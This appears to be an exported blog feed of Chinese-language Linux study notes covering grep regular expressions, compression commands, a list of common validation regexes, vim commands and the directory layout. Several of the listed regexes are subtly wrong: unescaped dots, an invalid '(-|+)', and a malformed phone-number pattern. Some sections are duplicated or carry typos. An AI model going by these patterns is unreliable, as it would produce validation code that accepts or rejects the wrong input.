</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-5.png" alt="RegExp"></p><h2 id="限定连续字符范围-‘-’"><a href="#限定连续字符范围-‘-’" class="headerlink" title="限定连续字符范围 ‘{}’"></a>限定连续字符范围 ‘{}’</h2><blockquote><p><code>{}</code> 可限制一个范围区间内的重复字符数。举个例子，若要找出 2~5 个 o 的连续字符串，如何做？ 此时便要用到 <code>{}</code> 了。由于 <code>{</code> 与 <code>}</code> 在 shell 中有特殊意义，需要用到转义字符 <code>\</code>。</p></blockquote><ul><li><strong>a{n}</strong> =&gt; 匹配字符 a 出现 n 次的字符串</li><li><strong>a{n,}</strong> =&gt; 匹配字符 a 至少出现 n 次的字符串</li><li><strong>a{n,m}</strong> =&gt; 匹配字符 a 至少出现 n 次至多出现 m 次的字符串</li></ul><h3 id="操作实例-4"><a href="#操作实例-4" class="headerlink" title="操作实例"></a>操作实例</h3><blockquote><p>文本内容与上一个实例一致。</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">grep -n &#39;o\{2\}&#39; test.txt
grep -n &#39;l\{2,\}&#39; test.tx
grep -n &#39;go\{2,6\}g&#39; test.txt
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-6.png" alt="RegExp"></p><h1 id="扩展正则表达式"><a href="#扩展正则表达式" class="headerlink" title="扩展正则表达式"></a>扩展正则表达式</h1><h2 id="简单对比"><a href="#简单对比" class="headerlink" title="简单对比"></a>简单对比</h2><p>正规表示法:</p><p><code>For Example:</code></p><pre><code class="bash">grep -v &#39;^$&#39; test.txt |grep -v &#39;^#&#39;
</code></pre><p>需要使用到管线命令来搜寻两次！ 那么如果使用延伸型的正规表示法，我们可以简化为：</p><p><code>For Example:</code></p><pre><code class="bash">egrep -v &#39;^$|^#&#39; test.txt
</code></pre><p>利用支持延伸型正规表示法的 egrep 与特殊字符 “|” 的组功能来区隔两组字符串，如此一来，是否方便很多呢？</p><p>此外，grep 默认仅支持基础正则表达式，如果要使用扩展性正则表达式，可以使用 grep - E。grep -E 与 egrep 相当于命令别名关系。</p><h2><a href="#" class="headerlink" title="+"></a>+</h2><blockquote><p>表示重复一个或一个以上的前一个 RE 字符</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">egrep -n &#39;go+d&#39; test.txt

grep -n &#39;goo*d&#39; test.txt      # 普通写法
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-7.png" alt="RegExp"></p><h2 id="-1"><a href="#-1" class="headerlink" title="?"></a>?</h2><blockquote><p>表示重复零个或一个前一个 RE 字符</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">egrep -n &#39;go?d&#39; test.txt
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-8.png" alt="RegExp"></p><h2 id="-2"><a href="#-2" class="headerlink" title="|"></a>|</h2><blockquote><p>表示用或的方式找出数个字符串</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">egrep -n &#39;gd|good&#39; test.txt
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-9.png" alt="RegExp"></p><h2 id="-3"><a href="#-3" class="headerlink" title="()"></a>()</h2><blockquote><p>表示找出群组字符串</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">egrep -n &#39;g(la|oo)d&#39; test.txt
# 也就是搜寻 glad 或 good 这两个字符串
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-10.png" alt="RegExp"></p><h2 id="-4"><a href="#-4" class="headerlink" title="()+"></a>()+</h2><blockquote><p>多个重复群组判别</p></blockquote><p><code>For Example:</code></p><pre><code class="bash">$　echo &#39;AxyzxyzxyzxyzC&#39;|egrep &#39;A(xyz)+C&#39;
$　echo &#39;AxyzxyzxyzxyzC&#39;|egrep &#39;A(xz)+C&#39;
# 也就是要找开头是 A 结尾是 C 中间有一个以上的 ‘xyz’ 或 ‘xz’ 字符串的意思。
# 结果显示 ‘A(xyz)+C’ 可以匹配， ‘A(xz)+C’ 没有匹配项。
</code></pre><p><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-11.png" alt="RegExp"><br><br><img src="http://oaq0p7t2g.bkt.clouddn.com/regexp-11.png" alt="RegExp"></p><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
            <tag> RegExp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 学习笔记（三）：文件的压缩与解压缩]]></title>
      <url>/2016/09/file-compression-and-decompression/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:16 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的学习笔记系列第三篇，这一篇将介绍在 Liunx 下压缩解压文件或目录常用命令。压缩文件及目录可以大大增加磁盘的利用率<a id="more"></a></p><h1 id="gz-格式"><a href="#gz-格式" class="headerlink" title=".gz 格式"></a>.gz 格式</h1><pre><code class="bash">gzip [fileName]          # 压缩文件
gzip -d [fileName].gz    # 解压缩文件
gunzip [fileName].gz     # 解压缩文件
</code></pre><blockquote><p>注意：只能压缩文件而不能压缩目录，且不保留原文件</p></blockquote><h1 id="tar-gz-格式"><a href="#tar-gz-格式" class="headerlink" title=".tar.gz 格式"></a>.tar.gz 格式</h1><pre><code class="bash">tar -czvf [folderName].tar.gz [folderName]    # 压缩目录或文件
tar -xzvf [folderName].tar.gz               # 解压目录或文件
</code></pre><h2 id="选项解释"><a href="#选项解释" class="headerlink" title="选项解释"></a>选项解释</h2><pre><code class="bash">-c    # 打包
-x    # 解包
-v    # 显示详细信息
-f    # 指定文件名
-z    # 打包同时压缩 / 解压缩
</code></pre><blockquote><p>注意：可以打包或压缩目录和文件，-f 选项是必须的，且必须放在选项中的最后一位，可以保留原文件</p></blockquote><h1 id="zip-格式"><a href="#zip-格式" class="headerlink" title=".zip 格式"></a>.zip 格式</h1><pre><code class="bash">zip -r [folderName].zip [folderName]   # 压缩目录
zip [fileName].zip [fileName]          # 压缩文件
unzip [fileName].zip                 # 压缩目录或文件
</code></pre><h2 id="选项解释-1"><a href="#选项解释-1" class="headerlink" title="选项解释"></a>选项解释</h2><pre><code class="bash">-r    压缩目录
</code></pre><h1 id="gz-格式-1"><a href="#gz-格式-1" class="headerlink" title=".gz 格式"></a>.gz 格式</h1><pre><code class="bash">gzip [fileName]          # 压缩文件
gzip -d [fileName].gz    # 解压缩文件
gunzip [fileName].gz     # 解压缩文件
</code></pre><blockquote><p>注意：只能压缩文件而不能压缩目录，且不保留原文件</p></blockquote><h1 id="zip-格式-1"><a href="#zip-格式-1" class="headerlink" title=".zip 格式"></a>.zip 格式</h1><pre><code class="bash">zip -r [folderName].zip [folderName]     # 压缩目录
zip [fileName].zip [fileName]            # 压缩文件
unzip -uo [fileName].zip -d [folderName] # 解压缩目录或者文件
</code></pre><p>选项解释</p><pre><code class="bash">-r    # 压缩目录
</code></pre><blockquote><p>注意：可以压缩目录或文件，-r 选项用于压缩目录，可以保留原文件</p></blockquote><h1 id="bz2-格式"><a href="#bz2-格式" class="headerlink" title=".bz2 格式"></a>.bz2 格式</h1><pre><code class="bash">bzip2 -k [fileName]                         # 压缩文件且保留原文件
tar -cjvf [folderName].tar.bz2 [folderName]   # 压缩目录或文###件
bunzip -k [fileName].bz2                    # 解压缩文件
tar -xjvf [folderName].tar.bz2              # 解压缩文件
</code></pre><p>选项解释</p><pre><code class="bash">-k      # 产生压缩文件后保留原文件
-j      # 格式为 .bz2 的压缩包
</code></pre><blockquote><p>注意：bzip2 命令，只能压缩文件，不能压缩目录，要使原文件保留，使用 -k 选 项；要压缩目录使用 tar 命令的 -j 选项 用 tar 命令的 -j 选项</p></blockquote><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常用的正则表达式]]></title>
      <url>/2016/09/regular-expression/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>很多不太懂正则的童鞋，在遇到需要用正则校验数据时，往往是在网上去找很久，结果找来的还是不很符合要求。所以我把开发中常用的一些正则表达式整理了一下，包括校验数字、字符、一些特殊的需求等等<a id="more"></a></p><h1 id="校验数字的表达式"><a href="#校验数字的表达式" class="headerlink" title="校验数字的表达式"></a>校验数字的表达式</h1><ul><li>数字 =&gt; <strong><code>^[0-9]*$</code></strong></li><li>n 位的数字 =&gt; <strong><code>^\d{n}$</code></strong></li><li>至少 n 位的数字 =&gt; <strong><code>^\d{n,}$</code></strong></li><li>m-n 位的数字 =&gt; <strong><code>^\d{m,n}$</code></strong></li><li>零和非零开头的数字 =&gt; <strong><code>^(0|[1-9][0-9]*)$</code></strong></li><li>非零开头的最多带两位小数的数字 =&gt; <strong><code>^([1-9][0-9]*)+(.[0-9]{1,2})?$</code></strong></li><li>带 1-2 位小数的正数或负数 =&gt; <strong><code>^(-)?\d+(.\d{1,2})?$</code></strong></li><li>正数、负数、和小数 =&gt; <strong><code>^(-|+)?\d+(.\d+)?$</code></strong></li><li>有两位小数的正实数 =&gt; <strong><code>^[0-9]+(.[0-9]{2})?$</code></strong></li><li>有 1~3 位小数的正实数 =&gt; <strong><code>^[0-9]+(.[0-9]{1,3})?$</code></strong></li><li>非零的正整数 =&gt; <strong><code>^[1-9]\d*$</code></strong> 或 <strong><code>^([1-9][0-9]*){1,3}$</code></strong> 或 <strong><code>^\+?[1-9][0-9]*$</code></strong></li><li>非零的负整数 =&gt; <strong><code>^-[1-9]\d*$</code></strong></li><li>非负整数 =&gt; <strong><code>^\d+$</code></strong> 或 <strong><code>^[1-9]\d*|0$</code></strong></li><li>非正整数 =&gt; <strong><code>^-[1-9]\d*|0$</code></strong> 或 <strong><code>^((-\d+)|(0+))$</code></strong></li><li>非负浮点数 =&gt; <strong><code>^\d+(.\d+)?$</code></strong> 或 <strong><code>^[1-9]\d*.\d*|0.\d*[1-9]\d*|0?.0+|0$</code></strong></li><li>非正浮点数 =&gt; <strong><code>^((-\d+(.\d+)?)|(0+(.0+)?))$</code></strong></li><li>正浮点数 =&gt; <strong><code>^[1-9]\d*.\d*|0.\d*[1-9]\d*$</code></strong></li><li>负浮点数 =&gt; <strong><code>^-([1-9]\d*.\d*|0.\d*[1-9]\d*)$</code></strong></li><li>浮点数 =&gt; <strong><code>^(-?\d+)(.\d+)?$</code></strong> 或 <strong><code>^-?([1-9]\d*.\d*|0.\d*[1-9]\d*|0?.0+|0)$</code></strong></li></ul><h1 id="校验字符的表达式"><a href="#校验字符的表达式" class="headerlink" title="校验字符的表达式"></a>校验字符的表达式</h1><ul><li>汉字 =&gt; <strong><code>^[\u4e00-\u9fa5]{0,}$</code></strong></li><li>双子节字符（包括字符） =&gt; <strong><code>[^\x00-\xff]</code></strong></li><li>英文和数字 =&gt; <strong><code>^[A-Za-z0-9]+$</code></strong> 或 <strong><code>^[A-Za-z0-9]{4,40}$</code></strong></li><li>长度为 3-20 的所有字符 =&gt; <strong><code>^.{3,20}$</code></strong></li><li>由 26 个英文字母组成的字符串 =&gt; <strong><code>^[A-Za-z]+$</code></strong></li><li>由 26 个大写英文字母组成的字符串 =&gt; <strong><code>^[A-Z]+$</code></strong></li><li>由 26 个小写英文字母组成的字符串 =&gt; <strong><code>^[a-z]+$</code></strong></li><li>由数字和 26 个英文字母组成的字符串 =&gt; <strong><code>^[A-Za-z0-9]+$</code></strong></li><li>由数字、 26 个英文字母或者下划线组成的字符串 =&gt; <strong><code>^\w+$</code></strong> 或 <strong><code>^\w{3,20}$</code></strong></li><li>中文、英文、数字包括下划线 =&gt; <strong><code>^[\u4E00-\u9FA5A-Za-z0-9_]+$</code></strong></li><li>中文、英文、数字但不包括下划线等符号 =&gt; <strong><code>^[\u4E00-\u9FA5A-Za-z0-9]+$</code></strong> 或 <strong><code>^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$</code></strong></li><li>可以输入含有^%&amp;’,;=?$\”等字符 =&gt; <strong><code>[^%&amp;&#39;,;=?$\x22]+</code></strong></li><li>禁止输入含有~的字符 =&gt; <strong><code>[^~\x22]+</code></strong></li></ul><h1 id="特殊需求表达式"><a href="#特殊需求表达式" class="headerlink" title="特殊需求表达式"></a>特殊需求表达式</h1><ul><li>空白行 =&gt; <strong><code>\n\s*\r</code></strong></li><li>QQ 号码 =&gt; <strong><code>[1-9][0-9]{4,}</code></strong></li><li>邮政编号 =&gt; <strong><code>[1-9]\d{5}(?!\d)</code></strong></li><li>Email 地址 =&gt; <strong><code>^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$</code></strong></li><li>域名 =&gt; <strong><code>[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.?</code></strong></li><li>网址 URL =&gt; <strong><code>[a-zA-z]+://[^\s]*</code></strong> 或 <strong><code>^//([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$</code></strong></li><li>手机号码 =&gt; <strong><code>^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$</code></strong></li><li>电话号码(“XXX-XXXXXXX”、”XXXX-XXXXXXXX”、”XXX-XXXXXXX”、”XXX-XXXXXXXX”、”XXXXXXX”和”XXXXXXXX) =&gt; <strong><code>^($$\d{3,4}-)|\d{3.4}-)?\d{7,8}$</code></strong></li><li>国内电话号码(0511-4405222、021-87888822) =&gt; <strong><code>\d{3}-\d{8}|\d{4}-\d{7}</code></strong></li><li>身份证号(15 位、18 位数字) =&gt; <strong><code>^\d{15}|\d{18}$</code></strong></li><li>短身份证号码(数字、字母 x 结尾) =&gt; <strong><code>^([0-9]){7,18}(x|X)?$</code></strong> 或 <strong><code>^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$</code></strong></li><li>身份证号(18 位数字) =&gt; <strong><code>^(\d{6})(\d{4})(\d{2})(\d{2})(\d{3})([0-9]|X)$</code></strong></li><li>帐号是否合法(字母开头，允许 5-16 字节，允许字母数字下划线) =&gt; <strong><code>^[a-zA-Z][a-zA-Z0-9_]{4,15}$</code></strong></li><li>密码(以字母开头，长度在 6~18 之间，只能包含字母、数字和下划线) =&gt; <strong><code>^[a-zA-Z]\w{5,17}$</code></strong></li><li>强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间) =&gt; <strong><code>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$</code></strong></li><li>日期格式 =&gt; <strong><code>^\d{4}-\d{1,2}-\d{1,2}</code></strong></li><li>一年的 12 个月(01～09 和 1～12) =&gt; <strong><code>^(0?[1-9]|1[0-2])$</code></strong></li><li>一个月的 31 天(01～09 和 1～31) =&gt; <strong><code>^((0?[1-9])|((1|2)[0-9])|30|31)$</code></strong></li><li>(年-月-日) 日期格式 =&gt; <strong><code>([0-9]{3}[1-9]|[0-9]{2}[1-9][0-9]{1}|[0-9]{1}[1-9][0-9]{2}|[1-9][0-9]{3})-(((0[13578]|1[02])-(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)-(0[1-9]|[12][0-9]|30))|(02-(0[1-9]|[1][0-9]|2[0-8])))</code></strong></li></ul><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> design </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RegExp </tag>
            
            <tag> Code </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 学习笔记（二）：vim 的使用]]></title>
      <url>/2016/09/usage-of-vim/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>本篇是 Liunx 的学习笔记系列第二篇，这一篇将介绍 vim 的使用技巧。vim 是一款终端编辑器，是由 vi 演变而来的，它与 vi 最大的区别是，vim 拥有代码高亮，其他操作都是共用的<a id="more"></a></p><h1 id="vim-常用操作"><a href="#vim-常用操作" class="headerlink" title="vim 常用操作"></a>vim 常用操作</h1><h2 id="打开文件操作"><a href="#打开文件操作" class="headerlink" title="打开文件操作"></a>打开文件操作</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><strong>vi</strong></td><td>进入 vi 而不读入任何文件</td></tr><tr><td><strong>vi [fileName]</strong></td><td>进入 vi 并读入指定名称的文件（新、旧文件均可）。</td></tr><tr><td><strong>vi +n [fileName]</strong></td><td>进入 vi 并且由文件的第几行开始。</td></tr><tr><td><strong>vi + [fileName]</strong></td><td>进入 vi 并且由文件的最后一行开始。</td></tr><tr><td><strong>vi +/pattern [fileName]</strong></td><td>打开文件，并将光标置于第一个与 pattern 匹配的串处</td></tr><tr><td><strong>vi [fileName]….[fileName]</strong></td><td>打开多个文件，依次进行编辑</td></tr><tr><td><strong>vi -r [fileName]</strong></td><td>在上次正用 vi 编辑时发生系统崩溃，恢复 [fileName]</td></tr><tr><td><strong>vimdiff fileA fileB</strong></td><td>比较编辑两个不同的文件</td></tr></tbody></table><h2 id="vim-操作模式转换图"><a href="#vim-操作模式转换图" class="headerlink" title="vim 操作模式转换图"></a>vim 操作模式转换图</h2><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-vim.png" alt="vim 操作模式转换图"></p><h2 id="插入命令"><a href="#插入命令" class="headerlink" title="插入命令"></a>插入命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><strong>a</strong></td><td>在光标所在行行尾插入</td></tr><tr><td><strong>i</strong></td><td>在光标所在字符前插入</td></tr><tr><td><strong>I</strong></td><td>在光标所在行行首插入</td></tr><tr><td><strong>o</strong></td><td>在光标下插入新行</td></tr><tr><td><strong>O</strong></td><td>在光标上插入新行</td></tr></tbody></table><h2 id="定位命令"><a href="#定位命令" class="headerlink" title="定位命令"></a>定位命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><strong>:set nu</strong></td><td>设置行号</td></tr><tr><td><strong>:set nonu</strong></td><td>取消行号</td></tr><tr><td><strong>gg</strong></td><td>到第一行</td></tr><tr><td><strong>G</strong></td><td>到最后一行</td></tr><tr><td><strong>nG</strong></td><td>到第 n 行</td></tr><tr><td><strong>:n</strong></td><td>到第 n 行</td></tr><tr><td><strong>$</strong></td><td>光标移至行尾</td></tr><tr><td><strong>0</strong></td><td>光标移至行首</td></tr></tbody></table><h2 id="删除命令"><a href="#删除命令" class="headerlink" title="删除命令"></a>删除命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><strong>x</strong></td><td>删除光标所在处字符</td></tr><tr><td><strong>nx</strong></td><td>删除光标所在处后 n 个字符</td></tr><tr><td><strong>dd</strong></td><td>删除光标所在行</td></tr><tr><td><strong>ndd</strong></td><td>删除 n 行</td></tr><tr><td><strong>dG</strong></td><td>删除光标所在行到文件末尾内容</td></tr><tr><td><strong>D</strong></td><td>删除光标所在处至行尾内容</td></tr><tr><td><strong>:n1,n2d</strong></td><td>删除第 n1 行到第 n2 行</td></tr></tbody></table><h2 id="复制和剪切命令"><a href="#复制和剪切命令" class="headerlink" title="复制和剪切命令"></a>复制和剪切命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><strong>yy</strong></td><td>复制当前行</td></tr><tr><td><strong>nyy</strong></td><td>复制当前行（包含当前行）以下 n 行</td></tr><tr><td><strong>dd</strong></td><td>剪切当前行</td></tr><tr><td><strong>ndd</strong></td><td>剪切当前行（包含当前行）以下 n 行</td></tr><tr><td><strong>p</strong></td><td>粘贴在当前光标所在行的下一行</td></tr><tr><td><strong>P</strong></td><td>粘贴在当前光标所在行的上一行</td></tr><tr><td><strong>nyl</strong></td><td>复制 n 个字符</td></tr><tr><td><strong>yw</strong></td><td>复制一个单词</td></tr><tr><td><strong>y$</strong></td><td>复制从当前位置到行尾</td></tr><tr><td><strong>yG</strong></td><td>复制从所在行到最后一行</td></tr><tr><td><strong>:n1,n2 co n3</strong></td><td>将 n1 行到 n2 行之间的内容拷贝到第 n3+1 行【n3行的下一行】</td></tr><tr><td><strong>:n1,n2 m n3</strong></td><td>将 n1 行到 n2 行之间的内容移至到第 n3 行下</td></tr><tr><td><strong>J</strong></td><td>把下一行的数据连接到本行之后</td></tr></tbody></table><h2 id="替换和取消命令"><a href="#替换和取消命令" class="headerlink" title="替换和取消命令"></a>替换和取消命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><strong>r</strong></td><td>取代光标所在处字符</td></tr><tr><td><strong>R</strong></td><td>从光标所在处开始替换字符，按 Esc 结束</td></tr><tr><td><strong>u</strong></td><td>取消上一步操作</td></tr></tbody></table><h2 id="搜索和搜索替换命令"><a href="#搜索和搜索替换命令" class="headerlink" title="搜索和搜索替换命令"></a>搜索和搜索替换命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><strong>/string</strong></td><td>搜索指定字符串</td></tr><tr><td><strong>:set ic</strong></td><td>搜索时忽略大小写</td></tr><tr><td><strong>:set noic</strong></td><td>取消搜索时忽略大小写</td></tr><tr><td><strong>n</strong></td><td>搜索指定字符串的下一个出现位置（即同方向）</td></tr><tr><td><strong>N</strong></td><td>在反方向上重复上一次搜索命令</td></tr><tr><td><strong>:%s/old/new/g</strong></td><td>全文替换指定字符串；需要替换询问时，g 改成 c</td></tr><tr><td><strong>:n1,n2s/old/new/g</strong></td><td>在一定方位范围内替换指定字符串；需要替换询问时，g 改成 c</td></tr></tbody></table><h2 id="保存和退出命令"><a href="#保存和退出命令" class="headerlink" title="保存和退出命令"></a>保存和退出命令</h2><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td><strong>:w</strong></td><td>保存修改</td></tr><tr><td><strong>:w /[path]/[fileName]</strong></td><td>另存为指定文件</td></tr><tr><td><strong>:wq</strong>,<strong>:x</strong></td><td>保存修改并退出</td></tr><tr><td><strong>ZZ</strong></td><td>快捷键，保存修改并退出</td></tr><tr><td><strong>:q!</strong></td><td>不保存修改并退出</td></tr><tr><td><strong>:wq!</strong></td><td>保存修改并退出（文件所有者及 root 可使用，通常在文件无写权限下使用）</td></tr><tr><td><strong>:n1,n2 w ! command</strong></td><td>将文件中 n1 行至 n2 行的内容作为 command 的输入并执行之，若不指定 n1，n2，则表示将整个文件内容作为 command 的输入【注意空格】例如 <code>:1,4 w! grep tom</code></td></tr><tr><td><strong>:!command</strong></td><td>暂时退出 vi 并执行 shell 指令，执行完毕后再回到 vi。【后期应该有用】</td></tr><tr><td><strong>:r!command</strong></td><td>将命令 command 的输出结果放到当前行【强大】</td></tr><tr><td><strong>:sh</strong></td><td>暂时退出 vi 到系统下，结束时按 <code>Ctrl + d</code> 则回到 vi。</td></tr><tr><td><strong>:e [fileName]</strong></td><td>打开文件 [fileName] 进行编辑【相当于退出当前的并打开另一个文件】</td></tr><tr><td><strong>:e!</strong></td><td>放弃修改文件内容，重新载入该文件编辑</td></tr><tr><td><strong>:w !sudo tee %</strong></td><td>以普通用户身份打开的 vim ，修改后以 root 身份保存</td></tr></tbody></table><h1 id="vim-使用技巧"><a href="#vim-使用技巧" class="headerlink" title="vim 使用技巧"></a>vim 使用技巧</h1><h2 id="导入文件内容"><a href="#导入文件内容" class="headerlink" title="导入文件内容"></a>导入文件内容</h2><pre><code class="bash">:r /[path]/[fileName]
</code></pre><h2 id="导入命令执行结果"><a href="#导入命令执行结果" class="headerlink" title="导入命令执行结果"></a>导入命令执行结果</h2><pre><code class="bash">:r !command
</code></pre><h2 id="寻找命令所在目录"><a href="#寻找命令所在目录" class="headerlink" title="寻找命令所在目录"></a>寻找命令所在目录</h2><pre><code class="bash">:!which command
</code></pre><h2 id="定义快捷键"><a href="#定义快捷键" class="headerlink" title="定义快捷键"></a>定义快捷键</h2><pre><code class="bash">:map ^P I#&lt;ESC&gt;      # 按 Ctrl+P 组合键用 # 注释当前行
:map ^B 0x         # 按 Ctrl+B 组合键删除当前行的注释
:map ^H istring&lt;ESC&gt;   # 按 Ctrl+H 组合键在光标所在位置插入字符串
</code></pre><blockquote><p>:map 定义快捷键时，按 Ctrl+V+key 定义快捷键；:map 定义的快捷键，重启或关机失效</p></blockquote><h2 id="连续行注释"><a href="#连续行注释" class="headerlink" title="连续行注释"></a>连续行注释</h2><pre><code class="bash">:n1,n2s/^/#/g     # 在 n1 行到 n2 行首添加注释 #
:n1,n2s/^#//g     # 在 n1 行到 n2 行首删除注释 #
:n1,n2s/^/\/\//g   # 在 n1 行到 n2 行首添加注释 //
:n1,n2s/^\/\//g    # 在 n1 行到 n2 行首删除注释 //
</code></pre><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><pre><code class="bash">:ab string1 string2    # 输入 string1 将会被替换成 string2
</code></pre><h2 id="编辑模式命令，永久生效"><a href="#编辑模式命令，永久生效" class="headerlink" title="编辑模式命令，永久生效"></a>编辑模式命令，永久生效</h2><p><code>普通</code>用户</p><pre><code class="bash">vim /home/[userName]/.vimrc
</code></pre><p><code>root</code> 用户</p><pre><code class="bash">vim /root/.vimrc
</code></pre><p>添加类似于以下命令代码，无需添加 :</p><pre><code class="bash">set nu
map ^P I#&lt;ESC&gt;
ab test this is test,this is test,this is test.
</code></pre><!-- rebuild by neat -->]]></content>
      
        <categories>
            
            <category> liunx </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Liunx </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Liunx 学习笔记（一）：目录结构说明]]></title>
      <url>/2016/09/liunx-directory-structure/</url>
      <content type="html"><![CDATA[<!-- build time:Sat Sep 02 2017 22:35:17 GMT+0800 (中国标准时间) --><p>接触了 Liunx 也有一段时间了，也算对 Liunx 有一定的了解，在这里将陆续的推出 Liunx 的学习笔记系列，做个记录，方便以后忘记有处可循。Liunx 是以文件系统为主的，所以 Liunx 下的每一个目录都有其各自的作用，则本篇将介绍 Liunx 的各个目录结构及其说明<a id="more"></a></p><h1 id="目录结构图"><a href="#目录结构图" class="headerlink" title="目录结构图"></a>目录结构图</h1><p><img src="http://oaq0p7t2g.bkt.clouddn.com/liunx-directory-structure.png" alt="目录结构图"></p><h1 id="目录结构说明"><a href="#目录结构说明" class="headerlink" title="目录结构说明"></a>目录结构说明</h1><table><thead><tr><th>目录</th><th>说明</th></tr></thead><tbody><tr><td><strong>/</strong></td><td>根目录。在 <code>Windows</code>，<code>DOS</code> 或者其他类似的操作系统里面，每个分区都会有一个相应的根目录。但是 <code>Linux</code> 和其他 <code>UNIX</code> 系统则把所有的文件都放在一个目录树里面，<code>/</code> 就是唯一的根目录。一般来讲，根目录下面很少保存什么文件，或者只有一个内核映像在这里。</td></tr><tr><td><strong>/boot</strong></td><td>很多 <code>Linux</code> 系统把内核映像和其他一些和启动有关的文件都放在这里。</td></tr><tr><td><strong>/tmp</strong></td><td>一般只有启动时产生的临时文件才会放在这个地方。我们自己的临时文件都放在 <code>/var/tmp</code>。</td></tr><tr><td><strong>/mnt</strong></td><td>这个目录下面放着一些用来安装其他设备的子目录，比如说 <code>/mnt/cdrom</code> 或者 <code>/mnt/floppy</code>。在有些 <code>Linux</code> 中这个目录被 <code>/mount</code> 代替。</td></tr><tr><td><strong>/lib</strong></td><td>启动的时候所要用到的库文件都放在这个目录下。那些非启动用的库文件都会放在 <code>/usr/lib</code> 下。内核模块是放在 <code>/lib/modules/</code> （内核版本）下的。</td></tr><tr><td><strong>/proc</strong></td><td>这个目录在磁盘上其实是不存在的。里面的文件都是关于当前系统的状态，包括正在运行的进程、硬件状态、内存使用的多少等。</td></tr><tr><td><strong>/dev</strong></td><td>这个目录下保存着所有的设备文件。里面有一些是由 <code>Linux</code> 内核创建的用来控制硬件设备的特殊文件。</td></tr><tr><td><strong>/var</strong></td><td>这里有一些被系统改变过的数据。比如说 <code>/var/tmp</code>，就是用来储存临时文件的。还有很多其他的进程和模块把它们的记录文件也放在这个地方，包括如下一些重要的子目录</td></tr><tr><td><strong>/var/log</strong></td><td>这里放着绝大部分的记录文件。随着时间的增长，这个目录会变得很庞大，所以要定期清理。</td></tr><tr><td><strong>/var/run</strong></td><td>包括了各种运行时的信息。</td></tr><tr><td><strong>/var/lib</strong></td><td>包括了一些系统运行时需要的文件。</td></tr><tr><td><strong>/var/spool</strong></td><td>邮件，新闻，打印序列的所在地。</td></tr><tr><td><strong>/root</strong></td><td><code>root</code> 用户的主目录。</td></tr><tr><td><strong>/home</strong></td><td>一般用户的主目录都会放在这个目录下。在 <code>Linux</code> 下，可以通过 <code>#cd ~</code> 来进入自己的主目录。</td></tr><tr><td><strong>/etc</strong></td><td>这里保存着绝大部分的系统配置文件。相对来讲，单个用户的系统配置文件会保存在这个用户自己的主目录里面。下面列举其中一些重要的子目录。</td></tr><tr><td><strong>/etc/X11</strong></td><td>这里放着X窗口系统（ <code>Linux</code> 中的图形用户界面系统）所需要的配置文件。<code>XF86Config</code> 就是把配置储存到这个地方的。<code>/etc/X11/fonts</code> 里面放着一些服务器需要的字体，还存放一些窗口管理器存放的配置文件。</td></tr><tr><td><strong>/etc/init.d</strong></td><td>这个目录保存着启动描述文件，包括各种模块和服务的加载描述。所以如果不清楚的话，千万不要随便删除其中的文件，这里存放的文件都是系统自动进行配置的，不需要用户配置。</td></tr><tr><td><strong>/etc/rcS.d</strong></td><td>这里放着一些连接到 <code>/etc/init.d</code> 的文件，根据 <code>runlevel</code> 的不同而执行相应的描述。这里的文件名都是由 <code>S</code> 来开头的，然后是一个两位的数字—-表示各种服务启动的顺序。比如，<code>S24foo</code> 就是在 <code>S42bar</code> 